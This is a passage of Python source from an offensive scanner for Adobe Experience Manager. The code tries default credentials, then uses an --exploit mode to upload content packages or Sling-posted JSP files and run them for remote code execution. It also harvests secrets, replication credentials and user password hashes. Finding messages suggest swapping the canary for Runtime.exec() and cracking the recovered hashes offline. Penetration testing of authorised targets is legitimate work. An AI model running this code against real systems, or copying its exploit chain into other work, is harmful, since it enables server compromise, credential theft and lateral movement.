            fp["indicators"].append("/etc/clientlibs/granite/utils.js served")

        # Try author-only marker
        r = self.client.get("/libs/granite/security/currentuser.json")
        if r is not None and r.status_code in (200, 401, 403):
            if r.status_code == 200 and "anonymous" in (r.text or "").lower():
                fp["instance"] = "publish"
            elif r.status_code in (401, 403):
                fp["instance"] = "author"

        self._fingerprint = fp
        if fp["is_aem"]:
            self.logger.good(f"AEM signature confirmed (instance={fp['instance']}, version={fp.get('version')})")
            self.reporter.add(Finding(
                title=f"AEM detected ({fp['instance']} instance)",
                severity=SEV_INFO, category=CAT_FINGERPRINT, target=self.target,
                evidence="; ".join(fp["indicators"][:6]),
                description=f"Server identified as Adobe Experience Manager. Instance type: {fp['instance']}.",
                role=self.role,
            ))
        else:
            self.logger.warn("No clear AEM fingerprint — running anyway, results may be noisy.")
        return fp

    # =======================================================================
    # 2. Default credentials probe
    # =======================================================================
    def check_default_credentials(self) -> None:
        if not self._enabled("creds"):
            return
        self.logger.section("Default credential probe")

        # Establish which probe path actually requires auth on this target
        auth_path = None
        for p in AUTH_PROBE_PATHS:
            r = self.client.get(p)
            if r is not None and r.status_code in (401, 403):
                auth_path = p
                self.logger.info(f"Using {p} as basic-auth probe (baseline {r.status_code})")
                break
        if auth_path is None:
            self.logger.warn("No basic-auth-gated path found; skipping credential probe.")
            return

        for user, password in DEFAULT_CREDENTIALS:
            token = base64.b64encode(f"{user}:{password}".encode()).decode()
            r = self.client.get(auth_path, headers={"Authorization": f"Basic {token}"})
            if r is None:
                continue
            if r.status_code == 200:
                self.reporter.add(Finding(
                    title=f"Default credentials accepted: {user}:{password}",
                    severity=SEV_CRITICAL,
                    category=CAT_AUTH,
                    target=self.target + auth_path,
                    evidence=f"HTTP 200 on {auth_path} with Basic Auth user={user!r}",
                    description=("AEM accepted a well-known default credential. "
                                 "Authenticate against /crx/de or /system/console and "
                                 "expect direct path to OS-level RCE via Felix bundle upload, "
                                 "Groovy console, or CRX package install."),
                    references=[
                        "https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem",
                        "https://github.com/0ang3el/aem-hacker",
                    ],
                    request=f"GET {auth_path} HTTP/1.1\nAuthorization: Basic {token}\n",
                    response_snippet=f"HTTP {r.status_code} | {len(r.content)} bytes",
                    role=self.role,
                ))

    # =======================================================================
    # 3. Exposed DATA-endpoint probe (consoles handled by check_consoles)
    # =======================================================================
    def check_exposed_endpoints(self) -> None:
        if not self._enabled("exposure"):
            return
        self.logger.section("Exposed data-endpoint probe")

        def probe(entry):
            path, sev, cat, label, sig = entry
            r = self.client.get(path)
            if r is None or r.status_code != 200:
                return
            # The big one: suppress login pages / auth redirects masquerading as 200.
            if self._is_authwall(r):
                self.logger.debug(f"{path}: login/auth wall -> suppressed")
                return
            body = safe_response_text(r, 8000)
            # JSON endpoints must actually return JSON (not an HTML shell).
            bare = path.split("?", 1)[0]
            if bare.endswith(".json"):
                s = body.lstrip()
                if not (s.startswith("{") or s.startswith("[")):
                    return
                if s in ("{}", "[]"):
                    return  # empty == no access / nothing to see
            if sig and not re.search(sig, body, re.I):
                # 200 but not the expected content signature — soft 404 / wrong page.
                return
            eff = sev
            extra = ""
            if RE_SECRET.search(body):
                eff = SEV_CRITICAL
                extra = " — response contains secret-like values"
            self.reporter.add(Finding(
                title=label + extra,
                severity=eff, category=cat, target=self.target + path,
                evidence=f"HTTP 200, {len(r.content)} bytes, readable {self._who()} (not a login page)",
                description=(f"{path} returned real content {self._who()}. "
                             "Verified it is not a login/auth-wall response."),
                request=self.client.request_signature("GET", path),
                response_snippet=snippet(body, 600),
                role=self.role,
            ))

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe, SENSITIVE_ENDPOINTS))

    # =======================================================================
    # 3b. Privileged console access — verified FUNCTIONALLY, not by shell HTML.
    # =======================================================================
    def check_consoles(self) -> None:
        if not self._enabled("exposure"):
            return
        self.logger.section("Privileged console access verification")

        felix_ok = self._verify_felix()
        pkg_ok = self._verify_packmgr()
        repo_ok = self._verify_repo_read()

        # Shells that merely render (200, not a login page) but where no
        # privileged operation succeeded -> single INFO each, so you know to
        # retry with role cookies. No more false CRITICALs.
        gated = [
            ("/system/console", "Felix OSGi console", felix_ok),
            ("/crx/de/index.jsp", "CRXDE Lite", repo_ok),
            ("/crx/packmgr/index.jsp", "CRX Package Manager", pkg_ok),
            ("/crx/explorer/index.jsp", "CRX Explorer", repo_ok),
            ("/bin/groovyconsole.html", "Groovy Console", False),  # RCE proof is in check_groovy_console
        ]
        for path, name, proven in gated:
            if proven:
                continue
            r = self.client.get(path)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                continue
            self.reporter.add(Finding(
                title=f"{name} shell loads but no privileged access {self._who()}",
                severity=SEV_INFO, category=CAT_EXPOSURE, target=self.target + path,
                evidence="Console HTML shell returned; backend operations were NOT confirmed accessible.",
                description=("This is the AEM console SHELL, which renders for anyone — it is "
                             "NOT proof of access. No privileged operation succeeded here. "
                             "Re-test with authenticated role cookies; a low-privilege session "
                             "that can actually drive this console would be the real finding."),
                role=self.role,
            ))

    def _verify_felix(self) -> bool:
        """Functional proof: bundles.json returns the live OSGi inventory."""
        r = self.client.get("/system/console/bundles.json")
        if r is None or r.status_code != 200 or self._is_authwall(r):
            return False
        b = r.text or ""
        if ('"data"' in b or '"s"' in b) and ("symbolicName" in b or "stateRaw" in b or "fragment" in b):
            self.reporter.add(Finding(
                title=f"Felix OSGi console accessible {self._role_tag()} — RCE via bundle install",
                severity=SEV_CRITICAL, category=CAT_RCE,
                target=self.target + "/system/console/bundles.json",
                evidence="bundles.json returned the live OSGi bundle inventory (functional access, not a shell).",
                description=("The Felix OSGi web console is functionally reachable. Installing a "
                             "malicious OSGi bundle via /system/console/bundles yields OS-level "
                             "RCE as the AEM service user."),
                references=["https://github.com/0ang3el/aem-rce-bundle"],
                request=self.client.request_signature("GET", "/system/console/bundles.json"),
                response_snippet=snippet(b, 500),
                role=self.role,
            ))
            return True
        return False

    def _verify_packmgr(self) -> bool:
        """Functional proof: package service returns an actual package listing."""
        for p in ("/crx/packmgr/service.jsp?cmd=ls",
                  "/crx/packmgr/list.jsp?_charset_=utf-8",
                  "/crx/packmgr/service/.json?cmd=ls"):
            r = self.client.get(p)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                continue
            b = r.text or ""
            if any(k in b for k in ("downloadName", "<package>", "buildCount",
                                    '"packages"', '"pages"', "<crx version")):
                self.reporter.add(Finding(
                    title=f"CRX Package Manager accessible {self._role_tag()} — RCE via package install",
                    severity=SEV_CRITICAL, category=CAT_RCE,
                    target=self.target + p,
                    evidence="Package service returned a real package listing (functional access).",
                    description=("Package Manager is functionally reachable. Build/upload a content "
                                 "package containing a malicious OSGi bundle or JSP and install it "
                                 "for code execution."),
                    references=["https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem"],
                    request=self.client.request_signature("GET", p),
                    response_snippet=snippet(b, 500),
                    role=self.role,
                ))
                return True
        return False

    def _verify_repo_read(self) -> bool:
        """Functional proof: a JCR node that should be ACL-protected is readable.

        This is the substance behind 'CRXDE access' — being able to read the
        repository. The CRXDE *shell* alone proves nothing.
        """
        candidates = [
            ("/crx/server/crx.default/jcr:root/.1.json", SEV_HIGH,   "Anonymous JCR read via CRX server"),
            ("/.1.json",                                 SEV_HIGH,   "Repository root readable"),
            ("/var.1.json",                              SEV_MEDIUM, "/var readable"),
        ]
        for path, sev, label in candidates:
            r = self.client.get(path)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                continue
            b = (r.text or "").lstrip()
            if b.startswith("{") and "jcr:primaryType" in b:
                eff = SEV_CRITICAL if RE_SECRET.search(b) else sev
                self.reporter.add(Finding(
                    title=f"{label} {self._role_tag()}",
                    severity=eff, category=CAT_JCR, target=self.target + path,
                    evidence=f"Returned JCR JSON ({len(r.content)} bytes) {self._who()}.",
                    description=("The JCR repository is readable without the expected "
                                 "authorization. Enumerate users, configs and content from "
                                 "here — this is what makes CRXDE access dangerous."),
                    request=self.client.request_signature("GET", path),
                    response_snippet=snippet(r.text, 600),
                    role=self.role,
                ))
                return True
        return False

    # =======================================================================
    # 3c. ACTIVE ESCALATION — turn read/console primitives into proof of impact.
    #     Safe-by-default: create-then-delete throwaway artifacts to CONFIRM the
    #     capability is real (not just intended read-only). The destructive
    #     end-to-end PoCs (drop+execute a JSP, add self to admins, exfil real
    #     data) only run with --exploit.
    # =======================================================================
    def _csrf_headers(self) -> Dict[str, str]:
        return {"CSRF-Token": self._csrf_token} if self._csrf_token else {}

    def _auth_post(self, path: str, **kw):
        headers = kw.pop("headers", {}) or {}
        if self._csrf_token:
            headers.setdefault("CSRF-Token", self._csrf_token)
        return self.client.post(path, headers=headers, **kw)

    @staticmethod
    def _pkg_success(resp) -> bool:
        if resp is None or resp.status_code not in (200, 201):
            return False
        t = resp.text or ""
        try:
            d = json.loads(t)
            if isinstance(d, dict) and d.get("success") is True:
                return True
        except Exception:
            pass
        return '"success":true' in t.replace(" ", "").lower()

    def check_escalation(self) -> None:
        if not self._enabled("escalation"):
            return
        self.logger.section(f"Active escalation {self._role_tag()}"
                            + ("  [--exploit ON]" if self.exploit else ""))
        self.fetch_csrf_token()
        confirmed = 0
        confirmed += int(self._escalate_packmgr())
        confirmed += int(self._escalate_crx_dav())
        confirmed += int(self._escalate_sling_write())
        self._harvest_secrets()
        # Turn the confirmed READ into concrete, provable impact:
        self._recover_credentials()
        if self.exploit:
            self._escalate_group_membership()
        elif confirmed:
            self.logger.warn("Write/install capability CONFIRMED. Re-run with --exploit to "
                             "prove end-to-end RCE (drops & removes a canary JSP) and attempt "
                             "admin-group escalation.")

    # ---- Package Manager: the primary RCE path. Try hard. ----
    def _escalate_packmgr(self) -> bool:
        ls = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
        if not (ls and ls.status_code == 200 and not self._is_authwall(ls) and "<crx" in (ls.text or "")):
            return False
        m = re.search(r'user="([^"]+)"', ls.text or "")
        acting = m.group(1) if m else "?"
        self.logger.info(f"Package Manager reachable (acting user={acting}); probing create/install rights...")

        # Capability probe: can we create an empty package? (signal only)
        rnd = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        grp = "aemhunter"
        pkgpath = f"/etc/packages/{grp}/{rnd}.zip"
        create = self._auth_post(f"/crx/packmgr/service/.json{pkgpath}",
                                 params={"cmd": "create", "packageName": rnd,
                                         "groupName": grp, "_charset_": "utf-8"})
        created = self._pkg_success(create)
        if created:
            self.reporter.add(Finding(
                title=f"Package Manager create rights confirmed {self._role_tag()} — install = RCE",
                severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + pkgpath,
                evidence=f"Created a throwaway package as user={acting} (then deleted it).",
                description=("This session can create packages via CRX Package Manager. Package "
                             "install executes arbitrary code => RCE. A content-editor role should "
                             "never have this."),
                references=["https://github.com/0ang3el/aem-rce-bundle"],
                request=f"POST /crx/packmgr/service/.json{pkgpath}?cmd=create&packageName={rnd}&groupName={grp}",
                response_snippet=safe_response_text(create, 300), role=self.role,
            ))
            self._auth_post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"})
        else:
            self.reporter.add(Finding(
                title=f"Package Manager listing readable {self._role_tag()} (create NOT confirmed)",
                severity=SEV_MEDIUM, category=CAT_EXPOSURE,
                target=self.target + "/crx/packmgr/service.jsp?cmd=ls",
                evidence=f"cmd=ls works as user={acting}; cmd=create returned "
                         f"{getattr(create, 'status_code', 'ERR')} (no success).",
                description=("Can enumerate packages. Empty-package create was rejected, but "
                             "upload+install may still work (different permission) — that is the "
                             "real RCE path and is attempted with --exploit."),
                response_snippet=safe_response_text(ls, 300), role=self.role,
            ))

        # The actual RCE: upload a package + install it. Crucially, this is tried
        # even when cmd=create was denied — upload/install is a separate right,
        # and install often writes /apps via the package-manager service session.
        if self.exploit:
            self._packmgr_rce_poc(acting)
        elif created:
            self.logger.warn("Re-run with --exploit to attempt the package upload+install RCE PoC.")
        return True

    def _packmgr_rce_poc(self, acting: str) -> None:
        canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
        jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
        grp = "aemhunter"
        name = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        pkgpath = f"/etc/packages/{grp}/{name}.zip"
        zipbytes = self._build_vault_package(grp, name, {"apps/aemhunter/poc.jsp": jsp})
        ref = self.client.base_url + "/crx/packmgr/index.jsp"
        headers = {"Referer": ref}
        if self._csrf_token:
            headers["CSRF-Token"] = self._csrf_token

        self.logger.info("upload+install RCE: building vault pkg, uploading, installing, executing...")
        upload_ok = False
        install_resp = None
        upload_status = "n/a"
        attempts = [
            ("/crx/packmgr/service.jsp",
             {}, {"cmd": "upload", "name": name, "force": "true", "install": "true"}),
            ("/crx/packmgr/service/.json",
             {"cmd": "upload"}, {"name": name, "force": "true", "install": "true"}),
            ("/crx/packmgr/service/.json/etc/packages/%s/%s.zip" % (grp, name),
             {"cmd": "upload"}, {"force": "true", "install": "true"}),
        ]
        for ep, params, data in attempts:
            files = {"package": (name + ".zip", zipbytes, "application/zip"),
                     "file": (name + ".zip", zipbytes, "application/zip")}
            up = self.client.post(ep, params=params, data=data, files=files, headers=headers)
            upload_status = getattr(up, "status_code", "ERR")
            self.logger.debug(f"upload via {ep} -> {upload_status}: {safe_response_text(up, 120)}")
            # Did the package actually land? Check the listing for our name.
            ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
            if self._pkg_success(up) or (ls2 and name in (ls2.text or "")):
                upload_ok = True
                # explicit install (in case install=true was ignored)
                install_resp = self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
                                                 params={"cmd": "install"}, headers=headers)
                self.client.post("/crx/packmgr/service.jsp",
                                 data={"cmd": "inst", "name": name, "group": grp}, headers=headers)
                break

        # Classify the result by fetching the JSP: executed / installed-but-source / not-written.
        ex = self.client.get("/apps/aemhunter/poc.jsp")
        ex_status = getattr(ex, "status_code", "ERR")
        ex_body = (ex.text if ex is not None else "") or ""
        if canary in ex_body:
            jsp_state = "executed"
        elif ex is not None and ex.status_code == 200 and ("<%" in ex_body or "System.getProperty" in ex_body):
            jsp_state = "installed-but-not-executed"   # JSP written but served as source
        elif ex is None or ex.status_code == 404:
            jsp_state = "not-written"
        else:
            jsp_state = f"other(HTTP {ex_status})"

        install_ok = self._pkg_success(install_resp)

        # thorough cleanup regardless of outcome
        self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"}, headers=headers)
        self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"}, headers=headers)
        self._auth_post("/apps/aemhunter", data={":operation": "delete"})

        if jsp_state == "executed":
            self.reporter.add(Finding(
                title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
                severity=SEV_CRITICAL, category=CAT_RCE,
                target=self.target + "/apps/aemhunter/poc.jsp",
                evidence=f"Uploaded+installed a content package containing a JSP and the server "
                         f"executed it: {snippet(ex_body, 160)}",
                description=("END-TO-END RCE: uploaded and installed a content package containing "
                             "a JSP and the server executed attacker Java code. Full server "
                             "compromise as the AEM service user. Swap the canary for "
                             "Runtime.exec() for OS command execution."),
                references=["https://github.com/0ang3el/aem-rce-bundle",
                            "https://github.com/0ang3el/aem-hacker"],
                request="POST /crx/packmgr/service.jsp (multipart vault pkg, install=true) "
                        "then GET /apps/aemhunter/poc.jsp -> canary",
                response_snippet=snippet(ex_body, 300), role=self.role,
            ))
            return

        # Not executed — say exactly where it broke, so it's actionable.
        if not upload_ok:
            blocked = "UPLOAD denied — the role cannot upload packages (package service is read-only for it)"
            nxt = "Package Manager is read-only for this role; RCE via packages is not available. Pivot to the READ-based impact (repo dump, replication creds, hashes)."
        elif not install_ok and jsp_state == "not-written":
            blocked = "INSTALL denied — package uploaded but install did not write /apps"
            nxt = "Upload works but install/activate is blocked. Try an OSGi-bundle package dropped into /apps/<x>/install (JcrInstaller runs as system), or find a writable /apps subpath."
        elif jsp_state == "installed-but-not-executed":
            blocked = "JSP-EXEC blocked — the JSP installed under /apps but is served as source, not executed"
            nxt = "Direct .jsp execution is disabled. Try a sling:resourceType script + a content node that renders it, or an OSGi-bundle package for code exec."
        else:
            blocked = f"unclear (upload_ok={upload_ok}, install_ok={install_ok}, jsp={jsp_state})"
            nxt = "Manual review of the package-manager responses recommended (run with -v)."

        self.reporter.add(Finding(
            title=f"Package install RCE NOT achieved {self._role_tag()} — blocked at: {blocked.split(' —')[0]}",
            severity=SEV_HIGH, category=CAT_RCE,
            target=self.target + "/crx/packmgr/service.jsp",
            evidence=f"user={acting} | upload_ok={upload_ok} (last status {upload_status}) | "
                     f"install_ok={install_ok} | /apps/aemhunter/poc.jsp -> {jsp_state}",
            description=(f"Package-manager RCE attempt result: {blocked}. Next: {nxt} "
                         "Note: the confirmed READ access (full repo + secrets + replication "
                         "creds + any user hashes) is already high, provable impact on its own."),
            references=["https://github.com/0ang3el/aem-rce-bundle"],
            response_snippet=safe_response_text(install_resp or ex, 300), role=self.role,
        ))

    def _build_vault_package(self, group: str, name: str, files: Dict[str, str]) -> bytes:
        """Build a minimal FileVault content-package zip in memory."""
        import io
        import zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            roots = sorted({"/" + p.rsplit("/", 1)[0] for p in files})
            filt = '<?xml version="1.0" encoding="UTF-8"?>\n<workspaceFilter version="1.0">\n'
            for rt in roots:
                filt += f'  <filter root="{rt}"/>\n'
            filt += '</workspaceFilter>\n'
            z.writestr("META-INF/vault/filter.xml", filt)
            z.writestr("META-INF/vault/properties.xml",
                       '<?xml version="1.0" encoding="UTF-8"?>\n'
                       '<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">\n'
                       '<properties>\n'
                       f'  <entry key="name">{name}</entry>\n'
                       f'  <entry key="group">{group}</entry>\n'
                       '  <entry key="version">1.0</entry>\n'
                       '</properties>\n')
            z.writestr("jcr_root/apps/aemhunter/.content.xml",
                       '<?xml version="1.0" encoding="UTF-8"?>\n'
                       '<jcr:root xmlns:jcr="http://www.jcp.org/jcr/1.0" '
                       'xmlns:nt="http://www.jcp.org/jcr/nt/1.0" '
                       'jcr:primaryType="nt:folder"/>\n')
            for relpath, content in files.items():
                z.writestr("jcr_root/" + relpath, content)
        return buf.getvalue()

    # ---- CRX DavEx: confirm repo WRITE ----
    def _escalate_crx_dav(self) -> bool:
        base = "/crx/server/crx.default/jcr:root"
        read = self.client.get(base + "/.1.json")
        if not (read and read.status_code == 200 and not self._is_authwall(read)
                and "jcr:primaryType" in (read.text or "")):
            return False
        rnd = "aemhunter-" + "".join(random.choices(string.ascii_lowercase, k=8))
        target = f"{base}/tmp/{rnd}"
        mk = self.client.request("MKCOL", target, headers=self._csrf_headers())
        if mk is not None and mk.status_code in (200, 201):
            self.reporter.add(Finding(
                title=f"CRX DavEx WRITE confirmed {self._role_tag()} — arbitrary repo write",
                severity=SEV_CRITICAL, category=CAT_JCR, target=self.target + target,
                evidence=f"MKCOL created {target} (HTTP {mk.status_code}); removed afterwards.",
                description=("CONFIRMED: this session can WRITE to the JCR over the CRX "
                             "WebDAV/DavEx server. Arbitrary repo write => deploy a JSP under "
                             "/apps for RCE, or tamper with ACLs / users / groups."),
                request=f"MKCOL {target}", response_snippet="", role=self.role,
            ))
            self.client.request("DELETE", target, headers=self._csrf_headers())
            return True
        self.reporter.add(Finding(
            title=f"CRX DavEx full-repo READ confirmed {self._role_tag()} (write NOT confirmed)",
            severity=SEV_HIGH, category=CAT_JCR, target=self.target + base + "/.1.json",
            evidence=f"Whole repository tree readable; MKCOL write returned "
                     f"{getattr(mk, 'status_code', 'ERR')}.",
            description=("Can read the entire repository structure over DavEx — use it for "
                         "content/user/config enumeration and to locate secrets."),
            response_snippet=snippet(read.text, 400), role=self.role,
        ))
        return False

    def _sling_can_write(self, base: str, marker: str) -> bool:
        """Create a node, confirm via GET .json, delete it. Returns True if write stuck."""
        r = self._auth_post(base, data={"jcr:primaryType": "nt:unstructured", "aemhunter": marker})
        if r is None or r.status_code not in (200, 201):
            return False
        v = self.client.get(base + ".json")
        ok = bool(v and v.status_code == 200 and marker in (v.text or ""))
        self._auth_post(base, data={":operation": "delete"})  # cleanup
        return ok

    def _discover_apps_children(self) -> List[str]:
        """List existing /apps child app folders (writable subpaths are RCE-capable)."""
        out: List[str] = []
        r = self.client.get("/apps.1.json")
        if r and r.status_code == 200 and not self._is_authwall(r):
            try:
                for k, v in json.loads(r.text).items():
                    if isinstance(v, dict) and not k.startswith(("jcr:", "sling:", "rep:")):
                        out.append("/apps/" + k)
            except Exception:
                pass
        return out[:8]

    # ---- Sling POST: find a CODE-EXECUTABLE writable path, then prove RCE ----
    def _escalate_sling_write(self) -> bool:
        marker = "aemhunter" + "".join(random.choices(string.ascii_lowercase, k=6))
        # Code-space candidates first: /apps root, then each existing /apps child
        # (a content editor often can't write /apps root but CAN write a specific app).
        code_candidates = ["/apps/aemhunter-" + marker]
        for child in self._discover_apps_children():
            code_candidates.append(f"{child}/aemhunter-{marker}")
        code_candidates.append("/libs/aemhunter-" + marker)

        # Non-code writes: useful signal but not directly RCE.
        # /content + /tmp are routinely writable for authors (their job / scratch)
        # so they are INFO; config trees are higher.
        other = [
            ("/etc/aemhunter-" + marker, SEV_HIGH, "config tamper"),
            ("/conf/aemhunter-" + marker, SEV_HIGH, "editable-template / config tamper"),
            ("/var/aemhunter-" + marker, SEV_MEDIUM, ""),
            ("/content/aemhunter-" + marker, SEV_INFO, "expected for an author; stored-XSS vector"),
            ("/tmp/aemhunter-" + marker, SEV_INFO, "scratch space, usually world-writable"),
        ]

        writable_code_path = None
        for base in code_candidates:
            if self._sling_can_write(base, marker):
                writable_code_path = base
                root = base.rsplit("/", 1)[0] or "/"
                self.reporter.add(Finding(
                    title=f"Sling WRITE to CODE space {root} {self._role_tag()} — JSP => RCE",
                    severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + base,
                    evidence=f"Created+confirmed+deleted a node under {root} {self._who()}.",
                    description=(f"This session can write to {root} (script/code space). Drop a "
                                 "JSP or a sling:resourceType script here and request it for RCE. "
                                 "Not intended for a content-editor role."),
                    references=["https://github.com/0ang3el/aem-hacker"],
                    request=f"POST {base}  (jcr:primaryType=nt:unstructured&aemhunter={marker})",
                    role=self.role,
                ))
                break

        any_write = writable_code_path is not None
        for base, sev, note in other:
            if self._sling_can_write(base, marker):
                any_write = True
                root = base.rsplit("/", 1)[0] or "/"
                suffix = f" — {note}" if note else ""
                self.reporter.add(Finding(
                    title=f"Sling POST write to {root} {self._role_tag()}{suffix}",
                    severity=sev, category=CAT_JCR, target=self.target + base,
                    evidence=f"Created+confirmed+deleted a node under {root} {self._who()}.",
                    description=("CONFIRMED JCR write via the Sling POST servlet. Writable config "
                                 "trees (/etc, /conf) enable tampering; /content write is expected "
                                 "for authors but enables stored XSS. None of these is direct RCE — "
                                 "see the CODE-space and Package Manager findings for that."),
                    request=f"POST {base}  (jcr:primaryType=nt:unstructured&aemhunter={marker})",
                    role=self.role,
                ))

        if self.exploit and writable_code_path:
            self._sling_jsp_rce(writable_code_path.rsplit("/", 1)[0])
        return any_write

    def _sling_jsp_rce(self, code_root: str) -> None:
        """Drop a JSP into a known-writable code root and execute it."""
        canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
        jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
        folder = f"{code_root.rstrip('/')}/aemhunter-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        # Sling file upload creates an nt:file node from a multipart field.
        self._auth_post(folder + "/", files={"poc.jsp": ("poc.jsp", jsp, "application/octet-stream")})
        ex = self.client.get(folder + "/poc.jsp")
        if ex is not None and canary in (ex.text or ""):
            self.reporter.add(Finding(
                title=f"REMOTE CODE EXECUTION confirmed via Sling JSP under {code_root} {self._role_tag()}",
                severity=SEV_CRITICAL, category=CAT_RCE,
                target=self.target + folder + "/poc.jsp",
                evidence=f"Wrote a JSP under {code_root} via Sling POST and executed it: {snippet(ex.text, 140)}",
                description=("END-TO-END RCE: uploaded a JSP into a code space via the Sling POST "
                             "servlet and the server executed attacker Java code. Swap the canary "
                             "for Runtime.exec() for OS command execution."),
                references=["https://github.com/0ang3el/aem-hacker"],
                request=f"POST {folder}/ (multipart poc.jsp) then GET {folder}/poc.jsp",
                response_snippet=snippet(ex.text, 300), role=self.role,
            ))
        self._auth_post(folder, data={":operation": "delete"})

    # ---- Secret harvesting from readable trees ----
    def _harvest_secrets(self) -> None:
        trees = ["/etc.6.json", "/etc/cloudservices.infinity.json", "/etc/key.infinity.json",
                 "/home/users.6.json", "/conf.6.json", "/etc/replication.infinity.json"]
        key_re = re.compile(
            r'"([^"]*(?:[Pp]assword|[Ss]ecret|[Aa]ccess[_-]?[Kk]ey|[Tt]oken|[Pp]rivate[_-]?[Kk]ey|'
            r'apiKey|api_key|clientSecret|client_secret|credential)[^"]*)"\s*:\s*"([^"]+)"')
        seen: Set[Tuple[str, str]] = set()
        count = 0
        for t in trees:
            if count >= 30:
                break
            r = self.client.get(t)
            if not (r and r.status_code == 200 and not self._is_authwall(r)):
                continue
            body = r.text or ""
            if not body.lstrip().startswith("{"):
                continue
            for mm in key_re.finditer(body):
                if count >= 30:
                    break
                k, v = mm.group(1), mm.group(2)
                if not v or k in ("jcr:primaryType",) or v in ("", "true", "false"):
                    continue
                dedup = (k, v[:24])
                if dedup in seen:
                    continue
                seen.add(dedup)
                count += 1
                encrypted = v.strip().startswith("{") and v.strip().endswith("}")
                self.reporter.add(Finding(
                    title=f"Secret value readable: {k}",
                    severity=SEV_HIGH if encrypted else SEV_CRITICAL,
                    category=CAT_DISCLOSURE, target=self.target + t,
                    evidence=f"{k} = {v[:80]}",
                    description=("A secret-like value is readable in the JCR by this session. "
                                 + ("This value is AEM-crypto-encrypted ({...}); if /etc/key "
                                    "(master key) is also readable or packageable, it can be "
                                    "decrypted offline. " if encrypted else
                                    "This appears to be a plaintext secret. ")
                                 + "Harvest all such values for the report."),
                    response_snippet=f"{k}: {v[:120]}", role=self.role,
                ))

    # ---- Turn READ access into provable impact: creds + user dump ----
    def _recover_credentials(self) -> None:
        self._recover_replication_creds()
        self._dump_users()

    def _recover_replication_creds(self) -> None:
        """Replication agents carry transport creds to the PUBLISH instance —
        usually a high-priv account. Recovering them = lateral movement + likely
        RCE on publish. This is concrete, provable impact from read access."""
        rep_paths = [
            "/etc/replication/agents.author.infinity.json",
            "/etc/replication/agents.publish.infinity.json",
            "/etc/replication.infinity.json",
            "/etc/replication/agents.author.-1.json",
        ]
        seen: Set[Tuple[str, str]] = set()  # dedupe the same agent across overlapping paths
        for p in rep_paths:
            if len(seen) >= 10:
                break
            r = self.client.get(p)
            if not (r and r.status_code == 200 and not self._is_authwall(r)
                    and (r.text or "").lstrip().startswith("{")):
                continue
            body = r.text or ""
            for m in re.finditer(r'"transportUri"\s*:\s*"([^"]+)"', body):
                if len(seen) >= 10:
                    break
                uri = m.group(1)
                window = body[max(0, m.start() - 600): m.end() + 600]
                user = re.search(r'"transportUser"\s*:\s*"([^"]*)"', window)
                pw = re.search(r'"transportPassword"\s*:\s*"([^"]*)"', window)
                uval = user.group(1) if user else "?"
                pval = pw.group(1) if pw else ""
                key = (uri, uval)
                if key in seen:
                    continue
                seen.add(key)
                self.reporter.add(Finding(
                    title=f"Replication transport credentials readable {self._role_tag()} — lateral move to publish",
                    severity=SEV_CRITICAL, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence=f"transportUri={uri} | transportUser={uval} | "
                             f"transportPassword={(pval[:28] + '...') if pval else '(empty)'}",
                    description=("A replication agent's transport credentials are readable. These "
                                 "authenticate the author to the PUBLISH instance (and dispatcher "
                                 "flush), frequently as a high-privilege/admin account — so this is "
                                 "direct lateral movement and a likely path to RCE on publish. "
                                 "Encrypted {...} passwords can be replayed through the agent or "
                                 "decrypted with the /etc/key master key."),
                    response_snippet=snippet(window, 300), role=self.role,
                ))

    def _dump_users(self) -> None:
        """Enumerate users / grab any leaked password hashes from readable /home."""
        sources = [
            ("/bin/querybuilder.json?path=/home/users&type=rep:User&p.hits=full&p.limit=500"
             "&p.properties=rep:authorizableId%20rep:principalName%20rep:password%20profile/email", "querybuilder"),
            ("/home/users.infinity.json", "sling-json"),
        ]
        for url, how in sources:
            r = self.client.get(url)
            if not (r and r.status_code == 200 and not self._is_authwall(r)):
                continue
            body = r.text or ""
            hashes = re.findall(r'"rep:password"\s*:\s*"([^"]+)"', body)
            ids = sorted(set(re.findall(r'"rep:authorizableId"\s*:\s*"([^"]+)"', body)))
            emails = sorted(set(re.findall(r'"email"\s*:\s*"([^"@]+@[^"]+)"', body)))
            if hashes:
                self.reporter.add(Finding(
                    title=f"User password HASHES dumped {self._role_tag()} — {len(hashes)} hashes (offline-crackable)",
                    severity=SEV_CRITICAL, category=CAT_DISCLOSURE,
                    target=self.target + url.split("?")[0],
                    evidence=f"Recovered {len(hashes)} rep:password hashes via {how}. "
                             f"Sample: {hashes[0][:48]}...",
                    description=("rep:password hashes for AEM users are readable. Crack them "
                                 "offline (they are typically salted SHA-256) to take over "
                                 "accounts — including potentially admin. Definitive, provable "
                                 "impact."),
                    response_snippet="; ".join(h[:40] for h in hashes[:5]), role=self.role,
                ))
                return
            if ids or emails:
                n = max(len(ids), len(emails))
                self.reporter.add(Finding(
                    title=f"User enumeration {self._role_tag()} — {n} users readable (no hashes exposed)",
                    severity=SEV_HIGH, category=CAT_DISCLOSURE,
                    target=self.target + url.split("?")[0],
